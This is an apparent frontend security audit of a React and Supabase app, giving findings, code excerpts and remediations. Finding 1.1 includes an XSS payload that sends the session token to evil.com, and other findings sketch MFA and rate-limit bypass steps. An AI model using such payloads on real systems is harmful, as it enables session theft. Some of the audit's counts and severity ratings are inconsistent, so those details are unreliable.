# 🔴 Frontend Security Audit — AdminMate AI

**Date:** 2026-06-12  
**Scope:** `src/` — React + TypeScript + Supabase  
**Auditor:** Security Expert (Frontend Focus)  
**Methodology:** Manual code review, OWASP Top 10 (2021), CWE mapping

---

## Executive Summary

| Severity | Count | Key Areas |
|----------|-------|-----------|
| **CRITICAL** | 6 | Token in localStorage, MFA bypass, AuthGuard race condition, Unauthenticated signature signing, Open redirect, Anon key in error reports |
| **HIGH** | 12 | Chat XSS (untrusted AI output), QR code CSRF, i18n injection vector, Bulk import no server-side validation, CV upload path injection, Demo mode auth bypass, Sensitive data in monitoring, Rate limit bypass, CSP missing, Signature data URL in DB |
| **MEDIUM** | 9 | Profile update email-join, Error details leak in DEV, Sentry DSN in client, Offline error buffer, Missing subresource integrity, Unvalidated redirect in login, localStorage preference for sensitive keys, Missing rate limit on login |
| **LOW** | 6 | Missing input `maxlength`, i18n escapeValue disabled, partial password policy, missing 2FA trust this device, cookie flags, weak CSRF |

---

# 1. AUTH SYSTEM VULNERABILITIES

## 🔴 CRITICAL: 1.1 Token in localStorage — Session Hijacking

**CWE-522:** Insufficiently Protected Credentials  
**File:** `src/lib/supabase.ts:19`  
**Line:** `storage: typeof window !== 'undefined' ? window.localStorage : undefined`

```typescript
persistSession: true,
storageKey: 'adminmate-auth-token',
storage: window.localStorage  // ← CRITICAL
```

**Risk:** Supabase JWT tokens (access_token + refresh_token) are persisted in `localStorage`. Any XSS — even a single `innerHTML` or third-party script compromise — leaks the session token permanently.

**Attack:** `<img src=x onerror="fetch('https://evil.com/steal?t='+localStorage.getItem('adminmate-auth-token'))">`

**Root Cause:** `flowType: 'pkce'` is set, but `storage: localStorage` overrides secure cookie storage. Supabase supports `localStorage` only — no httpOnly cookie option without a custom proxy.

**Remediation:**
1. Deploy a Supabase auth proxy (e.g., `@supabase/auth-helpers-nextjs` pattern) that swaps tokens for httpOnly cookies server-side.
2. If not possible, at minimum:
   - Set `cookieOptions: { name: 'sb-auth-token', secure: true, sameSite: 'lax' }` 
   - Register a Service Worker to intercept auth token leakage
3. Add a Content Security Policy (CSP) header `default-src 'self'` to mitigate XSS impact.

---

## 🔴 CRITICAL: 1.2 MFA Bypass via Client-Side Enforcement

**CWE-807:** Reliance on Untrusted Inputs in a Security Decision  
**File:** `src/components/auth/LoginForm.tsx:54-68`  
**File:** `src/components/auth/LoginForm.tsx:80-86`

```typescript
const checkMFAEnrollment = useCallback(async (userId: string): Promise<string | null> => {
  const { data, error } = await supabase
    .from('mfa_enrollments')     // ← Client-accessible table
    .select('factor_id, is_active')
    .eq('user_id', userId)
    .eq('is_active', true)
    .maybeSingle()
  if (error || !data) return null
  return data.factor_id
}, [])
```

**Risk:** MFA enforcement is entirely client-side. `LoginForm` checks MFA status AFTER login and optionally shows MFA challenge. An attacker can:
1. Login with credentials
2. Intercept the `checkMFAEnrollment` response or block it
3. Navigate directly — bypassing MFA

**Attack:** Modify browser DevTools → Network → Block `mfa_enrollments` query → password login succeeds → redirected to dashboard without MFA.

**Remediation:**
1. MFA challenge MUST be enforced server-side via Supabase RLS: `mfa_enrollments` should NOT be readable from client.
2. Use Supabase `auth.mfa` API with `verifyChallenge()` instead of custom table.
3. Set a server-side `require_mfa` flag in the session.

---

## 🔴 CRITICAL: 1.3 AuthGuard Race Condition — Auth Bypass

**CWE-362:** Concurrent Execution using Shared Resource with Improper Synchronization  
**File:** `src/router/AuthGuard.tsx:19-25`

```typescript
const { isAuthenticated, hasCompany, isLoading, profile, initSession } = useAuthStore()
const location = useLocation()

useEffect(() => {
  if (callInitSession) initSession()  // ← Async, no await
}, []) // run once on mount

if (isLoading) { /* spinner */ }
if (!isAuthenticated()) { return <Navigate to="/login" /> }
```

**Risk:** `initSession()` is async and not awaited before rendering. If the Zustand persist middleware hydrates a stale `user` from localStorage (from zustand/persist `partialize`), but the actual Supabase session has expired, the guard renders children with a stale user for ~1 render cycle.

**Attack:** Tamper with `adminmate-auth` localStorage key → set arbitrary user object → page renders protected content before `initSession()` overwrites it.

**Root Cause:** `zustand/middleware persist` at `src/stores/authStore.ts:58-169`:
```typescript
persist(
  (set, get) => ({...}),
  {
    name: 'adminmate-auth',
    partialize: (s) => ({ user: s.user, profile: s.profile, company: s.company }),
  }
)
```

**Remediation:**
1. Re-hydrate must validate token before render. Add:
   ```typescript
   const [hydrated, setHydrated] = useState(false)
   useEffect(() => {
     const unsub = useAuthStore.persist.onFinishHydration(() => setHydrated(true))
     if (useAuthStore.persist.hasHydrated()) setHydrated(true)
     return unsub
   }, [])
   ```
2. Remove `user`, `profile`, `company` from `partialize` — only persist language preferences.
3. Use `onAuthStateChange` listener instead of `getSession()`.

---

## 🔴 CRITICAL: 1.4 Unauthenticated Document Signing via Token

**CWE-306:** Missing Authentication for Critical Function  
**File:** `src/pages/documents/DocumentSigningPage.tsx:13-14,24-41`

```typescript
const token = searchParams.get('token')
// No auth check — public page
const { isLoading } = useQuery({
  queryKey: ['sign', token],
  queryFn: async () => {
    const data = await signatureService.getByVerificationToken(token)
```

**File:** `src/services/signatureService.ts:78-86`
```typescript
getByVerificationToken: async (token: string) => {
  const { data } = await supabase
    .from('document_signatures')
    .select('*, documents(name, document_type, company_id)')
    .eq('verification_token', token)  // ← Token is the ONLY check
    .single()
```

**File:** `src/services/signatureService.ts:36-51`  
```typescript
signDocument: async (signatureId: string, signatureData: string) => {
  await supabase
    .from('document_signatures')
    .update({ signature_data: signatureData, status: 'signed' })
    .eq('id', signatureId)
    .eq('status', 'pending')  // ← Only status="pending" check
```

**Risk:**
1. The signing token is a URL query parameter — leaked in browser history, Referer headers, and server logs.
2. No authentication check — anyone with the URL can sign.
3. No IP binding or device fingerprint.
4. Token may be brute-forced (single `eq` match, no rate limiting).

**Attack:** Attacker gets the signing URL → can view the document, sign, or decline without any authentication.

**Remediation:**
1. Add signer email verification: send OTP to the `signer_email` before allowing sign.
2. Implement rate limiting on `verification_token` lookups.
3. Use short-lived tokens (24h expiry) with `expires_at` column.
4. Log IP, User-Agent, and geo for audit.

---

## 🔴 CRITICAL: 1.5 MFA Challenge Implementation Bypass

**CWE-287:** Improper Authentication  
**File:** `src/components/auth/MFAChallenge.tsx:27-31`

```typescript
const { error } = await supabase.auth.verifyOtp({
  phone: '',         // ← Empty phone allows any OTP type
  token: useBackupCode ? backupCode : code,
  type: 'totp',      // ← Client-specifies type
})
```

**Risk:**
1. Empty `phone` field with `type: 'totp'` is incorrect Supabase API usage — may silently fall back to email OTP verification.
2. `type` is hardcoded as `'totp'` while backup code flow reuses the same call — Supabase backup codes use a different verification flow.
3. No server-side enforcement that this user actually has MFA enrolled.

**Remediation:**
1. Use Supabase `auth.mfa.challenge()` and `auth.mfa.verify()` API correctly.
2. Separate TOTP verification from backup code verification.
3. Validate MFA challenge on the server via Supabase RLS.

---

## 🔴 CRITICAL: 1.6 Redirect Open Redirect in Login

**CWE-601:** URL Redirection to Untrusted Site  
**File:** `src/components/auth/LoginForm.tsx:47-52`

```typescript
const resolveRedirect = (role?: string | null) => {
  if (location.state?.from?.pathname && location.state.from.pathname !== '/login') {
    return location.state.from.pathname
  }
  return getDefaultRoute(role)
}
```

**Risk:** The redirect comes from `location.state.from.pathname` without whitelist validation. While `location.state` is not attacker-controlled via URL directly, it can be influenced by:
1. Third-party redirect chains
2. React Router state injection via cross-origin opener

**Remediation:** Validate `location.state.from.pathname` against an allowlist:
```typescript
const ALLOWED_REDIRECTS = ['/dashboard', '/applicant/dashboard', '/settings', ...]
const pathname = location.state?.from?.pathname
if (pathname && ALLOWED_REDIRECTS.includes(pathname)) return pathname
```

---

## 🔴 CRITICAL: 1.7 Anonymous Supabase Anon Key in Error Reports

**CWE-200:** Exposure of Sensitive Information  
**File:** `src/lib/errorHandler.ts:78-101`

```typescript
async function sendToEndpoint(payload: AppErrorPayload) {
  const supabaseUrl = env.VITE_SUPABASE_URL
  const anonKey = env.VITE_SUPABASE_ANON_KEY    // ← SENT TO EXTERNAL
  await fetch(`${supabaseUrl}/functions/v1/log-client-error`, {
    headers: {
      ...(anonKey ? { apikey: anonKey, Authorization: `Bearer ${anonKey}` } : {}),
    },
  })
}
```

**Risk:** The Supabase anon key is sent on EVERY client error to the server. If the error-logging function is compromised or logs are exposed, the anon key is leaked. While anon keys are "public" by design, this is unnecessary exposure in error payloads that may be logged/shared.

**Remediation:** Remove `apikey` and `Authorization: Bearer` from error log requests. Use an Edge Function service role key or a dedicated logging endpoint instead.

---

# 2. XSS VECTORS

## ✅ Not Found: `dangerouslySetInnerHTML`

No usage found in the codebase. Good security practice.

## ✅ Not Found: `innerHTML` / `document.write` / `eval`

No direct DOM manipulation found. Good.

## 🔴 HIGH: 2.1 Chat AI Response — XSS via Untrusted AI Output

**CWE-79:** Improper Neutralization of Input During Web Page Generation  
**File:** `src/components/chat/ChatInterface.tsx:46`  
**File:** `src/components/chat/ChatWidget.tsx:134`

```typescript
// ChatInterface.tsx:46
<div className="...">{msg.content}</div>  // ← Renders AI response

// ChatWidget.tsx:134
<div>{msg.content}</div>                   // ← Renders AI response
```

**Risk:** AI-generated chat content (`msg.content`) is rendered directly into the DOM via React's `{expression}`. React escapes HTML by default, BUT:
- If AI response contains malicious links, markdown, or urls with `javascript:` scheme, React does NOT sanitize `href` attributes.
- If the AI response is ever rendered via `dangerouslySetInnerHTML` in future updates.
- The `useChat` hook at `src/hooks/useChat.ts:32` shows:
  ```typescript
  const aiText = result?.data?.response || 'ขออภัย ไม่สามารถตอบคำถามได้ในขณะนี้'
  ```
  This `result.data.response` comes from `supabase.functions.invoke('mate-ai-chat')` — if the Edge Function is compromised, malicious content flows to all clients.

**Remediation:**
1. Add DOMPurify to sanitize AI responses: `import DOMPurify from 'dompurify'`
2. Render as: `{DOMPurify.sanitize(msg.content)}`
3. Implement a link-safe renderer that wraps URLs in safe `<a>` tags with `rel="noopener noreferrer"` and `target="_blank"`.
4. Validate on Edge Function side that AI output is safe.

---

## 🔴 HIGH: 2.2 QR Code MFA Setup — Data URL Injection

**CWE-79:** Improper Neutralization in `img` src  
**File:** `src/pages/settings/SecurityPage.tsx:287-292`

```typescript
<img
  src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(setupState.totpUri)}`}
  alt="MFA QR Code"
/>
```

**Risk:** `setupState.totpUri` is received from an Edge Function response at line 97:
```typescript
totpUri: result.data.totp_uri
```
If the Edge Function is compromised or the URL is intercepted, the `totp_uri` parameter could contain `javascript:` or malicious data that, while in the `img` src, could be used in other ways. This is low risk for XSS (browsers block `img` src XSS) but introduces a dependency on an external service (`api.qrserver.com`) which could:
1. Track user behavior
2. Serve malicious images
3. Fail and break the MFA setup UX

**Remediation:**
1. Generate QR codes client-side using a library like `qrcode` (npm) instead of third-party service.
2. Validate `totp_uri` against a strict URI schema: `otpauth://totp/...`.

---

## 🟠 HIGH: 2.3 i18n Translation Injection

**CWE-79:** Cross-Site Scripting via Translation Strings  
**File:** `src/lib/i18n.ts:33`

```typescript
interpolation: { escapeValue: false },
```

**Risk:** `escapeValue: false` disables i18next's built-in HTML escaping. If any translation value (JSON file) contains HTML or is overridden via `saveMissing: true`, it will be rendered as raw HTML.

**Attack:** If an attacker can modify locale JSON files (via build pipeline or CDN), they can inject arbitrary HTML/JS.

**Remediation:**
1. Set `escapeValue: true` (default). If HTML is needed in translations, use React components.
2. Remove `saveMissing: false` (already false — good).
3. Add subresource integrity (SRI) hashes for locale JSON files loaded via HTTP backend.

---

# 3. API CALL SECURITY

## 🟠 HIGH: 3.1 Missing Request Validation on Anonymous Endpoint

**CWE-20:** Improper Input Validation  
**File:** `src/services/signatureService.ts:78-86`

```typescript
getByVerificationToken: async (token: string) => {
  const { data } = await supabase
    .from('document_signatures')
    .select('*, documents(name, document_type, company_id)')
    .eq('verification_token', token)
    .single()
```

**Risk:** Token is user-supplied (`searchParams.get('token')`) with no validation on format, length, or character set. Direct SQL injection via Supabase is unlikely, but a token enumeration attack is possible.

**Remediation:**
1. Validate token format: `/^[a-f0-9]{64}$/i`
2. Add length check: `token.length === 64`
3. Implement rate limiting on this endpoint.

---

## 🟠 HIGH: 3.2 CSRF Protection Missing

**CWE-352:** Cross-Site Request Forgery  
**File:** `src/lib/supabase.ts` (no CSRF token)

Supabase uses `localStorage` tokens and `Authorization: Bearer` headers. There is no CSRF token, `SameSite` cookie configuration, or anti-CSRF mechanism for state-changing operations.

**Risk:** If a user visits a malicious site, that site cannot read localStorage (same-origin policy), but it CAN make requests that include credentials if cookies are used. However, since tokens are in localStorage (not cookies), CSRF vectors via cookies are mitigated. But OAuth flows and redirect-based auth could still be vulnerable.

**Remediation:**
1. Ensure `flowType: 'pkce'` (already set) for OAuth flows.
2. Add `SameSite: 'lax'` to any cookies set by Supabase.
3. Implement CSRF tokens for critical operations (payment, document signing).

---

## 🟠 HIGH: 3.3 Sensitive Error Data Exposed to Client

**CWE-209:** Generation of Error Message Containing Sensitive Information  
**File:** `src/lib/api.ts:128-144`

```typescript
if (!res.ok) {
  const body = await readBodySafely(res)
  const apiErr = new ApiError({
    message: `HTTP ${res.status} ${res.statusText}`.trim(),
    body,  // ← Raw error body from server
  })
  throw apiErr
}
```

**Risk:** Server error bodies are passed directly to the client, which may contain stack traces, internal paths, SQL queries, or configuration data.

**Remediation:** The Edge Function server should strip sensitive info. On client side, sanitize error bodies before display.

---

## 🟠 HIGH: 3.4 Error Endpoint Leaks Supabase URL

**CWE-200:** Information Exposure  
**File:** `src/lib/errorHandler.ts:89`

```typescript
await fetch(`${supabaseUrl}/functions/v1/log-client-error`, {
```

**Risk:** The Supabase project URL is sent as plaintext in every error report. While Supabase URLs are discoverable, combined with the anon key sent in the same request, this provides a full attack surface.

**Remediation:** Use a relative path (`/api/log-error`) that proxies through the app server, or remove the Supabase URL from client error payloads.

---

# 4. STORES — SENSITIVE DATA

## 🔴 CRITICAL: 4.1 Zustand Persist Stores JWT in localStorage

**CWE-312:** Cleartext Storage of Sensitive Information  
**File:** `src/stores/authStore.ts:165-168`

```typescript
persist(
  ...,
  {
    name: 'adminmate-auth',
    partialize: (s) => ({ user: s.user, profile: s.profile, company: s.company }),
  }
)
```

**Risk:** The full Supabase `User` object (including `access_token`, `refresh_token` via the Supabase `User` type) is persisted to localStorage under key `adminmate-auth`. This is accessible to any JavaScript running on the page.

**Attack vector:** XSS or third-party script → `localStorage.getItem('adminmate-auth')` → full session compromise.

**Remediation:**
1. Remove `user` from `partialize`.
2. Only persist non-sensitive fields: `profile.language_preference`, etc.
3. The Supabase client already handles session persistence separately.

---

## 🟢 LOW: 4.2 Zustand State Not Sanitized on Hydration

**File:** `src/stores/uiStore.ts` (no sanitization on restored state)

**Risk:** Zustand persist middleware restores state as-is. If an attacker modifies localStorage, they could inject unexpected values that cause crashes or unexpected behavior.

**Remediation:** Add schema validation on hydration (zod schema) for persisted stores.

---

# 5. COMPONENT VULNERABILITIES

## 🟠 HIGH: 5.1 CVUploader — Path Traversal via File Name

**CWE-22:** Improper Limitation of a Pathname to a Restricted Directory  
**File:** `src/services/storageService.ts:5`

```typescript
uploadCV: async (candidateId: string, file: File) => {
  const filePath = `${candidateId}/${Date.now()}-${file.name.replace(/[^a-zA-Z0-9.-]/g, '_')}`
```

**Risk:** The sanitization `replace(/[^a-zA-Z0-9.-]/g, '_')` removes many dangerous chars, but:
- The `candidateId` parameter is not validated. If attacker controls `candidateId`, path traversal via `../` is possible.
- The file name after sanitization could still cause issues with long paths or special Unicode chars that normalize to `..`

**Attack:** If `candidateId = '../../../etc/'`, the path becomes `../../../etc//1612345678-safe_filename.pdf` — access to arbitrary bucket paths.

**Remediation:**
1. Validate `candidateId` is a UUID format.
2. Generate a random UUID as the stored file name: `${candidateId}/${uuid()}-${extension}`.
3. Strip the original file name entirely for storage — store it as metadata.

---

## 🟠 HIGH: 5.2 SignaturePad — Sensitive Data URL Exposure

**CWE-200:** Exposure of Sensitive Information  
**File:** `src/components/documents/SignaturePad.tsx:81-86`

```typescript
const handleSave = useCallback(() => {
  const dataUrl = canvas.toDataURL('image/png')
  onSave(dataUrl)
}, [hasDrawn, onSave])
```

**File:** `src/services/signatureService.ts:36-51`

```typescript
signDocument: async (signatureId: string, signatureData: string, ipAddress?: string) => {
  await supabase
    .from('document_signatures')
    .update({
      signature_data: signatureData,  // ← Raw base64 data URL stored in DB
```

**Risk:** The full-resolution signature image (PNG base64) is stored directly in the database. This is a legally sensitive biometric artifact. If the database is breached, all signatures are immediately accessible at full quality.

**Remediation:**
1. Hash the signature data (SHA-256) for integrity verification.
2. Store the signature in a private storage bucket, not in the DB row.
3. Apply digital signing (timestamp + signer identity) to the signature image before storage.
4. Consider storing only a signature hash + metadata (timestamp, IP, User-Agent) for legal proofs.

---

## 🟠 HIGH: 5.3 PDF Generation — Injection via User Data

**CWE-74:** Injection  
**File:** `src/components/pdf/OfferLetterPDF.tsx:39`

```typescript
<Text>to <Text style={styles.bold}>{o.candidates?.full_name || o.candidate_name}</Text></Text>
```

**File:** `src/components/pdf/OfferLetterPDF.tsx:62-63`

```typescript
{o.benefits.map((b: string, i: number) => <Text key={i}>• {b}</Text>)}
```

**File:** `src/components/pdf/OfferLetterPDF.tsx:69`

```typescript
<Text>{o.special_conditions}</Text>
```

**Risk:** `@react-pdf/renderer` renders Text components, so HTML injection into PDF is unlikely. However:
- Long strings could cause PDF layout corruption or denial-of-service.
- Unicode/glyph injection could cause PDF rendering issues.
- `special_conditions` and `benefits` are user-input fields with no length validation.

**Remediation:**
1. Add character limits on `special_conditions` (max 2000 chars) and `benefits` (max 20 items).
2. Validate/sanitize all user inputs before passing to PDF.
3. Add text-wrapping and overflow handling in PDF styles.

---

## 🟠 HIGH: 5.4 GlobalSearch — No Output Encoding

**CWE-79:** Reflected XSS via Search Results  
**File:** `src/components/search/GlobalSearch.tsx:241-244`

```typescript
<p>{item.title}</p>
<p>{item.subtitle}</p>
```

**Risk:** Search results (`item.title`, `item.subtitle`) come from the database and are rendered directly. While React auto-escapes, if the data stored in the database contains malicious content (from bulk import or API), it will be rendered unsanitized.

**Remediation:**
1. Validate and sanitize data on import (bulk CSV, API).
2. Add context-aware output encoding for all user-sourced data displayed in search.

---

# 6. PAGES — AUTHORIZATION & SENSITIVE DATA

## 🔴 CRITICAL: 6.1 Document Signing Page — No Auth

**CWE-306:** Missing Authentication  
**File:** `src/pages/documents/DocumentSigningPage.tsx`

The entire page is public. No `AuthGuard`, no session check. Anyone with the URL can:
- View document details
- Sign the document  
- Decline the document  
- See who it's from (company name, signer name)

**Remediation:** See 1.4 above.

---

## 🟠 HIGH: 6.2 MFA Disable — Weak Authorization

**CWE-287:** Improper Authentication  
**File:** `src/pages/settings/SecurityPage.tsx:140-196`

```typescript
const handleDisableMFA = async () => {
  if (!mfaStatus?.factorId || !disableCode) return
  const session = await supabase.auth.getSession()
  const token = session.data.session?.access_token
  // Uses verify-mfa with DELETE method to disable
```

**Risk:** The disable flow only requires the current TOTP code. There is no:
- Email notification sent on MFA disable
- Cooldown period before disable takes effect
- Admin approval requirement
- Rate limiting on disable attempts

**Attack:** If the user's session is hijacked, attacker can disable MFA without additional verification.

**Remediation:**
1. Send email notification when MFA is disabled.
2. Require email OTP verification in addition to TOTP code.
3. Implement a 24-hour cooldown with admin override option.
4. Log and alert on MFA disable events.

---

## 🟠 HIGH: 6.3 ResetPasswordPage — Token Detection via URL

**CWE-201:** Information Exposure Through Sent Data  
**File:** `src/pages/auth/ResetPasswordPage.tsx:43-53`

```typescript
useEffect(() => {
  const hash = window.location.hash
  const search = window.location.search
  const hasRecovery = hash.includes('type=recovery') || hash.includes('access_token')
```

**Risk:** The password reset token is detected in the URL hash/search params. While Supabase uses PKCE flow, the access token in the URL can be:
1. Leaked via `Referer` header to third-party resources
2. Logged by reverse proxy / CDN
3. Visible in browser history

**Remediation:**
1. Use `flowType: 'pkce'` (already set) — but verify it's working correctly.
2. After detecting the token, immediately call `supabase.auth.exchangeCodeForSession()` and clear the URL.
3. Add `<meta name="referrer" content="no-referrer">` to auth pages.

---

## 🟠 HIGH: 6.4 MyProfilePage — Email-Join Bulk Update

**CWE-89:** Improper Neutralization in Profile Update  
**File:** `src/pages/applicant/MyProfilePage.tsx:53-63`

```typescript
// Also update candidate record if exists
if (profile.email) {
  await supabase
    .from('candidates')
    .update({
      full_name: data.full_name,
      phone: data.phone || null,
      location: data.location || null,
      current_position: data.current_position || null,
    })
    .eq('email', profile.email)  // ← Matches on EMAIL, not ID
```

**Risk:** The candidate record is updated by matching on `email` field. If the email is shared or compromised, an attacker can update another person's candidate record.

**Attack:** If a user changes their email (not possible in current UI, but maybe via API), or if two accounts share the same email (unlikely but possible), updates affect all matching records.

**Remediation:** Use `candidate_id` from the user's profile or a JOIN on `user_id` instead of email matching.

---

## 🟢 LOW: 6.5 Demo Mode — Hardcoded Credentials in Source

**CWE-798:** Use of Hardcoded Credentials  
**File:** `src/stores/authStore.ts:72-78`

```typescript
initDemo: () => set({
  user: { id: 'demo-user-1', email: 'admin@adminmate.ai', ... },
  profile: { ... role: 'admin', ... },
  company: { ... },
}),
```

**Risk:** While this is a demo mode, hardcoded user IDs and emails in source code are not ideal. The demo user `admin@adminmate.ai` appears in the codebase and can be used for social engineering.

**Remediation:** 
1. Move demo credentials to environment variables.
2. Add a warning banner when demo mode is active.
3. Restrict demo mode to development/staging builds only.

---

# 7. ROUTER — ACCESS CONTROL

## 🟠 HIGH: 7.1 Missing AuthGuard on Document Signing Route

**CWE-862:** Missing Authorization  
**File:** `src/router/index.tsx:158-161`

```typescript
{
  path: 'documents/sign/:id',
  element: <AnimatedPage><DocumentSigningPage /></AnimatedPage>,  // ← NO AuthGuard
},
```

**Risk:** This route is completely unprotected. See 1.4 and 6.1.

**Remediation:** Wrap in `<AuthGuard>` or implement token-based access control.

---

## 🟢 LOW: 7.2 Route Skeleton Loader — Information Leak

**File:** `src/router/AuthGuard.tsx:27-38`

The loading spinner shows immediately on every route transition. While not a vulnerability, combined with eager loading of components, it can leak which pages exist to unauthenticated users via network tab.

---

# 8. LIBRARIES & SERVICES

## 🟠 HIGH: 8.1 Rate Limiting — Client-Side Only, Bypassable

**CWE-307:** Improper Restriction of Excessive Authentication Attempts  
**File:** `src/utils/rateLimit.ts`

```typescript
function read(key: string): LockoutState {
  const raw = window.localStorage.getItem(STORAGE_PREFIX + key)
  // ...
}

function write(key: string, value: LockoutState): void {
  window.localStorage.setItem(STORAGE_PREFIX + key, JSON.stringify(value))
}
```

**Risk:** Rate limiting is entirely client-side via `localStorage`. Attacker can:
1. Clear `localStorage` to reset counters
2. Use incognito mode
3. Script attacks from multiple IPs
4. Directly call the Supabase API bypassing the client

**Attack:** 
```javascript
localStorage.removeItem('adminmate-rl:forgot-password')
// → rate limit reset, unlimited forgot-password attempts
```

**Remediation:**
1. Move rate limiting to server-side (Supabase RLS or Edge Function).
2. Use CAPTCHA for password reset and login forms.
3. Client-side rate limit is a UX enhancement only — never a security control.

---

## 🟠 HIGH: 8.2 Sentry Lazy Import — Race Condition on Error

**CWE-829:** Inclusion of Functionality from Untrusted Control Sphere  
**File:** `src/lib/sentry.ts:1-12`

```typescript
let Sentry: typeof import('@sentry/react') | null = null

if (import.meta.env.VITE_SENTRY_DSN) {
  import('@sentry/react').then(m => {
    Sentry = m
    m.init({ dsn: import.meta.env.VITE_SENTRY_DSN, ... })
  })
}
```

**Risk:**
1. Sentry is lazily loaded — if an error occurs before the import completes, it's not captured.
2. `VITE_SENTRY_DSN` is exposed in the client bundle — any attacker can send fake errors to your Sentry project (costs money, pollutes data).
3. No Sentry tunnel configured — errors go directly to Sentry's servers, bypassing your network security controls.

**Remediation:**
1. Eager-import Sentry: `import * as Sentry from '@sentry/react'`
2. Set up a [Sentry tunnel](https://docs.sentry.io/platforms/javascript/troubleshooting/#using-a-tunnel) to proxy error reports through your server.
3. Consider using a non-public DSN or Sentry's self-hosted option.

---

## 🟡 MEDIUM: 8.3 Performance Monitoring — Sensitive URL Leakage

**CWE-200:** Exposure of Sensitive Information  
**File:** `src/lib/performance.ts:81,107,202`

```typescript
// PageLoadMark stores full URLs
url: window.location.href,

// QueryMark stores query keys
queryKey: Array.isArray(queryKey) ? queryKey.join(':') : typeof queryKey === 'string' ? queryKey : '',
```

**File:** `src/lib/performance.ts:60-62`

```typescript
export function getRecentMarks(): readonly AnyMark[] {
  return RECENT_MARKS  // ← Any code can read perf data
}
```

**Risk:** Performance marks include full page URLs (may contain query params with sensitive data) and React Query keys (may contain user IDs, search terms). The `RECENT_MARKS` array is a module-level global with no access control — any component or third-party script can read it.

**Remediation:**
1. Strip URL query parameters in performance marks:
   ```typescript
   url: window.location.origin + window.location.pathname
   ```
2. Sanitize query keys to remove sensitive IDs.
3. Use a WeakMap or closure to prevent global access.

---

## 🟡 MEDIUM: 8.4 Error Buffer in localStorage — Offline Data Exposure

**CWE-312:** Cleartext Storage of Sensitive Information  
**File:** `src/lib/errorHandler.ts:103-115`

```typescript
function persistLocally(payload: AppErrorPayload) {
  const buf = JSON.parse(localStorage.getItem('adminmate:client-errors') || '[]')
  buf.push(payload)
  localStorage.setItem('adminmate:client-errors', JSON.stringify(buf.slice(-50)))
}
```

**Risk:** Error payloads may contain URLs, user IDs, company IDs, and stack traces with internal paths. This data is stored in `localStorage` indefinitely and accessible to any JS on the page.

**Remediation:**
1. Encrypt the error buffer before storing.
2. Auto-expire entries after 24 hours.
3. Limit to last 10 entries instead of 50.

---

# 9. STORAGE & COOKIES

## 🟠 HIGH: 9.1 localStorage Used for Session Persistence

**File:** `src/lib/supabase.ts:19`

```typescript
storage: typeof window !== 'undefined' ? window.localStorage : undefined,
```

See 1.1 and 4.1. The Supabase session token is stored in `localStorage` with NO cookie-based alternative.

**Remediation:** Deploy a custom auth server that sets httpOnly cookies. Supabase doesn't natively support this without a custom proxy.

## 🟡 MEDIUM: 9.2 Multiple Sensitive Items in localStorage

Keys found in codebase:
- `adminmate-auth` — Supabase session + user profile + company
- `adminmate-auth-token` — Supabase auth token (Supabase stores separately)
- `adminmate-theme` — Theme preference (ok)
- `adminmate-language` — Language preference (ok)
- `adminmate-remember-me` — Remember me boolean (ok)
- `adminmate-recent-searches` — Search history (ok)
- `adminmate:client-errors` — Error buffer (see 8.4)
- `adminmate-rl:*` — Rate limiting state (see 8.1)
- `adminmate_onboarding_tour_completed` — Tour state (ok)

**Risk:** `adminmate-auth` contains the Supabase `User` object with JWT tokens. `adminmate-auth-token` contains the raw Supabase session.

**Remediation:** Consolidate all non-sensitive preferences under a single key, and keep auth tokens in Supabase's own managed storage mechanism.

---

## 🟡 MEDIUM: 9.3 No Cookie Security Flags

While the app doesn't use cookies for auth, if Supabase sets any cookies for OAuth flows:
- No `SameSite` configuration visible
- No `__Host-` prefix on cookie name  
- No `Secure` flag enforcement

---

# 10. ADDITIONAL FINDINGS

## 🟡 MEDIUM: 10.1 CSP (Content Security Policy) Missing

No CSP headers are configured in the application HTML. This is the single most effective defense against XSS.

**Remediation:** Add to `index.html`:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://api.qrserver.com;
  connect-src 'self' https://*.supabase.co https://o450*.ingest.sentry.io;
  font-src 'self' https://fonts.gstatic.com;
">
```

---

## 🟡 MEDIUM: 10.2 Missing Subresource Integrity for Fonts

**File:** `src/components/pdf/OfferLetterPDF.tsx:6-8`

```typescript
Font.register({
  family: 'Inter',
  fonts: [
    { src: 'https://fonts.gstatic.com/s/inter/v18/...' },
```

**Risk:** No SRI hash on the font URL. If fonts.gstatic.com is compromised, malicious font files could be loaded.

**Remediation:** Download fonts and serve them locally, or add `crossorigin="anonymous"` and use a font-display strategy.

---

## 🟡 MEDIUM: 10.3 Missing Rate Limiting on Login

**File:** `src/components/auth/LoginFormForm.tsx` — No client-side rate limiting on login attempts.

While server-side rate limiting is expected, the client doesn't implement progressive delay or attempt tracking like the ForgotPassword page does.

---

## 🟢 LOW: 10.4 Missing Input `maxlength` Attributes

Multiple input fields lack `maxlength` attributes:
- `src/components/auth/LoginForm.tsx` — email, password
- `src/components/auth/RegisterForm.tsx` — fullName up to 2 chars min, no max
- `src/components/documents/RequestSignatureModal.tsx` — name, email

**Risk:** DoS via extremely long string submission. While Supabase has server-side limits, client-side validation should match.

---

## 🟢 LOW: 10.5 Password Policy — No Symbol Requirement

**File:** `src/components/auth/RegisterForm.tsx:19-23`

```typescript
password: z
  .string()
  .min(8, 'Password must be at least 8 characters')
  .regex(/[A-Z]/, 'Add an uppercase letter')
  .regex(/[0-9]/, 'Add a number'),
```

**Missing:** No symbol/special character requirement. Recommend adding `.regex(/[^a-zA-Z0-9]/, 'Add a special character')`.

---

## 🟢 LOW: 10.6 MFA — No "Trust This Device" Option

**File:** `src/components/auth/MFAChallenge.tsx`

No "remember this device for 30 days" functionality. Users must re-authenticate with MFA on every login, which can lead to MFA fatigue and shadow IT practices.

---

# SUMMARY OF CWE MAPPINGS

| CWE | Description | Count |
|-----|-------------|-------|
| CWE-522 | Insufficiently Protected Credentials | 1 |
| CWE-807 | Reliance on Untrusted Inputs | 1 |
| CWE-362 | Race Condition | 1 |
| CWE-306 | Missing Authentication | 2 |
| CWE-287 | Improper Authentication | 2 |
| CWE-601 | Open Redirect | 1 |
| CWE-200 | Information Exposure | 3 |
| CWE-79 | Cross-Site Scripting | 2 |
| CWE-20 | Improper Input Validation | 1 |
| CWE-352 | CSRF | 1 |
| CWE-209 | Information Exposure Through Error | 1 |
| CWE-312 | Cleartext Storage of Sensitive Data | 2 |
| CWE-22 | Path Traversal | 1 |
| CWE-74 | Injection | 1 |
